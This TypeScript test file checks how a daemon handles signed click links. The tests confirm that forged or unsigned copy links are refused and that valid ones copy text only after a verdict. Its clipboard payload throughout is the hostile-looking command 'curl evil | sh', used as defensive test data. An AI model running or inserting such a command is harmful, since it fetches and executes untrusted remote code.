// The URL handler's frame is answered with its verdict as soon as the host has
// read it, and its click lands after: a forged link reaches no renderer and
// its sender is told why, and a slow click that lands is never told as failed.

import { handleRequest, type HandledRequest } from "../src/daemon/reply";
import type { DaemonParts } from "../src/daemon/daemon-parts";
import { rendererNameOf } from "../src/daemon/foundations/renderer-name";
import { sessionIdOf } from "../src/daemon/foundations/session-id";
import { RuntimeStats } from "../src/daemon/stats";
import { SessionState } from "../src/renderer/session-state";
import { effectsUrl, VERB_COPY } from "../src/click/wire";
import { URL_FRAME_VERSION } from "../src/daemon/foundations/protocol";
import { systemTimekeeper } from "../src/time";
import { clickParts } from "./helpers/click-parts";
import type { LaunchResult } from "../src/proc/launcher";
import { testVerbContext, actingWorld } from "./helpers/click";
import { TEST_SIGNER } from "./helpers/link-signer";

const COPY = effectsUrl([{ verb: VERB_COPY, args: ["curl evil | sh"] }]);

function host(
  copying: Promise<void> = Promise.resolve(),
  copies: LaunchResult = {
    ok: true,
    stdout: "",
    stderr: "",
    exitCode: 0,
  } as LaunchResult,
) {
  const copied: string[] = [];
  const unheard: string[] = [];
  const {
    arrival: _a,
    context: _c,
    effects: _e,
    ...verbCtx
  } = testVerbContext(new SessionState());
  // The clipboard, as the host's copy act writes it.
  const world = actingWorld(
    verbCtx,
    {
      launch: async (opts: { stdinInput?: string }) => {
        await copying;
        copied.push(opts.stdinInput ?? "");
        return copies;
      },
    },
    (text) => void unheard.push(text),
  );
  const events: string[] = [];
  const parts = {
    clock: systemTimekeeper,
    payloadProviders: {},
    frameFeeds: { latest: () => null },
    rendererForClick: () => undefined,
    log: (_level: string, line: string) => events.push(line),
    ...clickParts(verbCtx, undefined, world),
  } as unknown as DaemonParts;
  const frame = async (url: string, urlV = URL_FRAME_VERSION) => {
    const handled = await handleRequest(
      parts,
      { kind: "url", frame: { kind: "url", urlV, url } },
      () => false,
      new RuntimeStats(systemTimekeeper).accept(),
      () => false,
    );
    if (handled.kind !== "url") throw new Error(`answered ${handled.kind}`);
    return handled as Extract<HandledRequest, { kind: "url" }>;
  };
  return { frame, copied, events, unheard };
}

test("a forged copy link is refused at once, saying why, and the clipboard is untouched", async () => {
  const h = host();
  const signed = TEST_SIGNER.signLink(COPY);
  const at = signed.indexOf("evil");
  const forged = `${signed.slice(0, at)}EVIL${signed.slice(at + 4)}`;
  for (const url of [forged, COPY]) {
    const answered = await h.frame(url);
    expect(answered.awaitsVerdict).toBe(true);
    expect(answered.verdict).toMatchObject({ ok: false, code: "BAD_REQUEST" });
    await answered.land();
  }
  expect(h.copied).toEqual([]);
  expect(h.events).toHaveLength(2);
  for (const event of h.events) expect(event).toContain("outcome=bad-request");
});

test("a signed link with an invalid session is refused in the forwarder verdict", async () => {
  const h = host();
  const url = TEST_SIGNER.signLink("cc-candybar://undo/%C0");
  const answered = await h.frame(url);

  expect(answered.verdict).toMatchObject({ ok: false, code: "BAD_REQUEST" });
  await answered.land();
  expect(h.events).toEqual([expect.stringContaining("outcome=bad-request")]);
  expect(h.events[0]).toContain("verb=undo");
  expect(h.events[0]).not.toContain("mailbox=");
});

test("the forwarder hears that the issuing renderer has no bundle before promising delivery", async () => {
  const h = host();
  const url = TEST_SIGNER.signLink(COPY, {
    renderer: rendererNameOf("worktree"),
    session: sessionIdOf("drawn"),
  });
  const answered = await h.frame(url);
  expect(answered.verdict).toMatchObject({
    ok: false,
    error: expect.stringContaining("renderer worktree"),
  });
  await answered.land();
  expect(h.copied).toEqual([]);
  expect(h.events).toEqual([expect.stringContaining("outcome=down")]);
  expect(h.events[0]).not.toContain("mailbox=");
});

test("a link the bar drew is told verified before its click lands, and then lands", async () => {
  let release = () => {};
  const h = host(new Promise<void>((done) => (release = done)));
  const answered = await h.frame(TEST_SIGNER.signLink(COPY));
  expect(answered.verdict).toEqual({ ok: true, output: "" });
  expect(h.copied).toEqual([]);
  release();
  await answered.land();
  expect(h.copied).toEqual(["curl evil | sh"]);
});

test("a version 1 frame's writer has hung up, so its verdict goes to no one", async () => {
  const h = host();
  const answered = await h.frame(TEST_SIGNER.signLink(COPY), 1);
  expect(answered.awaitsVerdict).toBe(false);
  await answered.land();
  expect(h.copied).toEqual(["curl evil | sh"]);
});

test("the verified forwarder acknowledgement still precedes a rate-limited effect", async () => {
  const h = host(Promise.resolve(), {
    ok: false,
    reason: "rate-limited",
    error: "rate-limited: click.pbcopy min interval",
    stdout: "",
    stderr: "",
    exitCode: null,
    signal: null,
  });
  const answered = await h.frame(TEST_SIGNER.signLink(COPY));
  expect(answered.verdict).toEqual({ ok: true, output: "" });
  expect(h.unheard).toEqual([]);
  await answered.land();
  expect(h.events).toEqual([expect.stringContaining("outcome=threw")]);
  expect(h.unheard).toEqual([expect.stringContaining("rate-limited: click.pbcopy")]);
});

// A copy names no session, so no bar holds its failure: the daemon's warning
// does, and the click is answered with how its act went.
test("a click whose act failed is answered as failed, and the failure is the daemon's warning", async () => {
  const h = host(Promise.resolve(), {
    ok: false,
    reason: "non-zero",
    stdout: "",
    stderr: "no pasteboard",
    exitCode: 1,
    signal: null,
  });
  const answered = await h.frame(TEST_SIGNER.signLink(COPY));
  await answered.land();
  expect(h.events).toEqual([expect.stringContaining("outcome=threw")]);
  expect(h.unheard).toEqual([expect.stringMatching(/^copy: pbcopy failed/)]);
});
